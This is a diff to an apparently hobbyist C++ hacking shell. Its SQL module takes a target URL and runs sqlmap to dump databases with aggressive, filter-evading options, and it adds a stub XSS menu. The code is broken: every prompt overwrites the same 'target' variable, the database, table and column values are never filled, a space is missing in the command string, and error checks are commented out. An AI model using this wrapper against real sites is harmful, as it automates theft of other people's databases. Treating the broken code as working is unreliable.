@@ -153,11 +153,11 @@ class Start {
 
 							log.info("Engime started!, successully called engine");
 
-							int result = Engine::Command::Exec(cmd);
+							int result = Engine::Command::exec(cmd);
 
 							if (result != 0) {
-								int error = Message::Sql::Error();
-								log.debug("Engine Hitting something.. " + error);
+								Message::Sql::Error();
+								log.debug("Engine Hitting something.. ");
 							}
 							
 						} else {
@@ -181,10 +181,10 @@ class Start {
 		}
 
 		void QLdump() {
-			std::string input;
+			std::string target;
 			Message::Sql::dumpSql();
 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~# ";
-			std::getline(std::cin, input);
+			std::getline(std::cin, target);
 
 			if (target == "1") {
 				std::string target;
@@ -192,38 +192,38 @@ class Start {
 				// log.info("\nPlease input the target")
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
 	 			// log.info("\nPlease input the database")
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 
-				if (!target.empty) {
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent"
+				if (!target.empty()) {
+					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
 
 					log.info("Engine started, successfully called function");
 					
-					int result = Engine::Command::Exec(cmd);
+					Engine::Command::exec(cmd);
 
-					if (result != 0) {
-						int output = Message::Sql:Error();
-						log.debug("Engine hitting something..." + output);
-					}
+					// if (cmd != 0) {
+						// Message::Sql::Error();
+						// log.debug("Engine hitting something...");
+					// }
 					
 				} else {
 					Message::Error::ErrorInput();
-					log.warn("Message::Error::ErrorInput(); : Warning user entered wrong output")
+					log.warn("Message::Error::ErrorInput(); : Warning user entered wrong output");
 				}
 				
 			} else if (target == "2") {
 				std::string target;
 				std::string db;
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 
-				if (!target.empty) {
-				
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump-all --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent"
+				if (!target.empty()) {
+					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump-all --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
+					Engine::Command::exec(cmd);
 				} else {
 					Message::Error::ErrorInput();
 				}
@@ -234,19 +234,57 @@ class Start {
 				std::string table;
 				std::string column;
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/table# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/column# ";
-				std::getline(std::cin, input);
+				std::getline(std::cin, target);
 
 				if (!target.empty()) {
-					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " -T " + table +  " -C " + column + " --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent"
+					std::string cmd = "sqlmap -u " + target + "--batch -D " + db + " --dump-all --risk 3 --level 5 --tamper=space2comment --thread 10 --random-agent";
+					Engine::Command::exec(cmd);
 				} else {
 					Message::Error::ErrorInput();
 				}
+			} else if (target == "4") {
+				std::string target;
+				std::string db;
+				std::string table;
+
+				std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/target# ";
+				std::getline(std::cin, target);
+	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/database# ";
+				std::getline(std::cin, target);
+	 			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/sqlDump] ~/table# ";
+				std::getline(std::cin, target);
+
+				if (!target.empty()) {
+
+				}
+			}
+		}
+
+		// xss ssection
+		void XSStart() {
+			Message::Xss::Xss();
+		}
+
+		void XSSdetect() {
+			Message::Xss::Warn();
+		}
+
+		void Menu()	{
+			Message::Xss::Menu();
+			std::string input;
+			std::cout << "[" << "\e[31m" << "root" << "\e[37m" << "@intip/module/xss] ~# ";
+			std::getline(std::cin, input);
+
+			if (input == "1") {
+				std::cout << "kontolodon" << std::endl;
+			} else {
+				Message::Error::Global();
 			}
 		}
 };
@@ -285,6 +323,10 @@ int main() {
 	    	shell.QLDefault();
 		} else if (intip == "sql start") {
 			shell.QLStart();
+		} else if (intip == "xss help") {
+			shell.XSStart();
+		} else if (intip == "exit") {
+			break;
 		} else {
 			Message::Error::ErrorInput();
 			log.debug("User entered wrong input, no matching output!");
